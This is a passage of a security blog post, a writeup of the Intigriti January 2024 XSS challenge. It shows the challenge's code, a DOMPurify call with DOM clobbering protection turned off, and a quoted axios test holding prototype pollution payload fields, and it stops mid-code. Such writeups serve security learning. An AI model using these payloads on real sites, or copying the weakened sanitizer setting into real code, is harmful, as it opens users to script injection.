@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Intigriti 0124 XSS Writeup - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2024/02/17/intigriti-0124-writeup/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2024/02/17/en/intigriti-0124-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="Last month’s (January 2024) Intigriti challenge was very interesting, made by @kevin_mizu. I have often seen him post client-side related challenges on Twitter before, and this time the quality of the">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti 0124 XSS Writeup">
+<meta property="og:url" content="https://blog.huli.tw/2024/02/17/en/intigriti-0124-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="Last month’s (January 2024) Intigriti challenge was very interesting, made by @kevin_mizu. I have often seen him post client-side related challenges on Twitter before, and this time the quality of the">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/intigriti-0124-writeup/cover-en.png">
+<meta property="article:published_time" content="2024-02-17T04:40:00.000Z">
+<meta property="article:modified_time" content="2024-02-17T11:16:16.949Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/intigriti-0124-writeup/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Intigriti 0124 XSS Writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=4.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#easier-than-expected">1&nbsp;&nbsp;<b>Easier than expected?</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#intended-solution-is-not-that-difficult-as-wellor-is-it">2&nbsp;&nbsp;<b>Intended solution is not that difficult as well…or is it?</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#one-of-the-three-most-common-illusions-i-can-solve-it">3&nbsp;&nbsp;<b>One of the three most common illusions: I can solve It</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#hint-to-the-rescue">4&nbsp;&nbsp;<b>Hint to the rescue</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#afterword">5&nbsp;&nbsp;<b>Afterword</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2024/02/17/intigriti-0124-writeup/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Intigriti 0124 XSS Writeup
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2024-02-17T04:40:00.000Z" itemprop="datePublished">17 February 2024</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>Last month’s (January 2024) Intigriti challenge was very interesting, made by <a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu">@kevin_mizu</a>. I have often seen him post client-side related challenges on Twitter before, and this time the quality of the challenge was as good as ever, worth documenting.</p>
+<p>The challenge link is here, if you haven’t seen it yet, you can take a look: <a target="_blank" rel="noopener" href="https://challenge-0124.intigriti.io/">https://challenge-0124.intigriti.io/</a></p>
+<span id="more"></span>
+
+<h2><span id="easier-than-expected">Easier than expected?</span></h2><p>The code for the challenge is quite short. Let’s start with the frontend part, which is basically just an HTML:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/main.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Hey &lt;%- name %>,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Which repo are you looking for?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%= search %><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/img/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loading<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50px<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>35%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>homepage<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/axios.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/jquery-3.7.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>
+                    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The part <code>&lt;h2&gt;Hey &lt;%- name %&gt;</code> is the only part related to the backend, where DOMPurify is used for sanitization:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">name</span><span class="token operator">:</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">search</span><span class="token operator">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>search
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It’s worth noting the <code>SANITIZE_DOM: false</code> here, which disables protection against DOM Clobbering. This suggests that the challenge is related to DOM Clobbering, as this setting is deliberately turned off.</p>
+<p>The main logic of the challenge is in the <code>search</code> function:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>
+                <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Actually, there doesn’t seem to be any vulnerability in the above code snippet. So after reviewing it, I went to check the libraries used in the challenge, which are jQuery 3.7.1 and axios 1.6.2. Although the file names were not mentioned, it was evident from the file contents.</p>
+<p>Upon investigation, it was found that 1.6.2 is not the latest version, and a prototype pollution vulnerability was fixed in version 1.6.4: <a target="_blank" rel="noopener" href="https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e">https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</a></p>
+<p>The commit even includes an exploit directly, great:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'should resist prototype pollution CVE'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[0]'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[1]'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'__proto__.x'</span><span class="token punctuation">,</span> <span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'constructor.prototype.y'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token function">formDataToJSON</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
